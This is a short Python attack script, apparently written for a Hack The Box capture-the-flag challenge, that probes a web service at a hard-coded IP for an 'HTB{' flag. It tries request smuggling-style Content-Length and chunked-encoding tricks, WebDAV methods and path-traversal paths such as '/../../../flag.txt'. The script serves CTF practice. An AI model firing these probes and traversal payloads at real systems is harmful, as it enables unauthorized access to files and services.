#!/usr/bin/env python3
import requests
import struct
import time
import re

def crc16(data, poly=0x1D0F):
    crc = 0x0000
    for byte in data:
        crc ^= (byte << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ poly) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc

base_url = 'http://94.237.53.81:59575'

# INNOVACIÓN 125: Probar con Content-Length manipulado
print("[*] INNOVACIÓN 125: Content-Length manipulation")
s = requests.Session()
s.get(base_url)

data_payload = {'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': 'E1FF217D'}
r = s.post(f'{base_url}/transmit', data=data_payload, headers={'Content-Length': '0'})
print(f"CL=0: {r.status_code}")

r = s.post(f'{base_url}/transmit', data=data_payload, headers={'Content-Length': '999999'})
print(f"CL=999999: {r.status_code}")

# INNOVACIÓN 126: Chunked encoding
print("\n[*] INNOVACIÓN 126: Transfer-Encoding: chunked")
s.headers['Transfer-Encoding'] = 'chunked'
r = s.post(f'{base_url}/transmit', data=data_payload)
print(f"Chunked: {r.status_code}")

# INNOVACIÓN 127: Probar WebDAV methods
print("\n[*] INNOVACIÓN 127: WebDAV methods")
s2 = requests.Session()

for method in ['PROPFIND', 'PROPPATCH', 'MKCOL', 'COPY', 'MOVE', 'LOCK', 'UNLOCK']:
    try:
        r = s2.request(method, base_url)
        if r.status_code != 405 and r.status_code != 404:
            print(f"  {method}: {r.status_code}")
            if 'HTB{' in r.text:
                print(f'    [SUCCESS]', re.findall(r'HTB\{[^}]+\}', r.text))
    except:
        pass

# INNOVACIÓN 128: Directory traversal en URL path
print("\n[*] INNOVACIÓN 128: Path traversal")
s = requests.Session()
s.get(base_url)

paths = [
    '/transmit/../flag',
    '/transmit/../../flag.txt',
    '/../../../flag.txt',
    '/./flag.txt',
]

for path in paths:
    try:
        r = s.get(f'{base_url}{path}')
        if r.status_code == 200 and 'Not Found' not in r.text:
            print(f"[+] {path}: {r.text[:200]}")
            if 'HTB{' in r.text:
                print(f'  [SUCCESS]', re.findall(r'HTB\{[^}]+\}', r.text))
    except:
        pass

print("\n[*] Innovaciones 125-128 completadas")
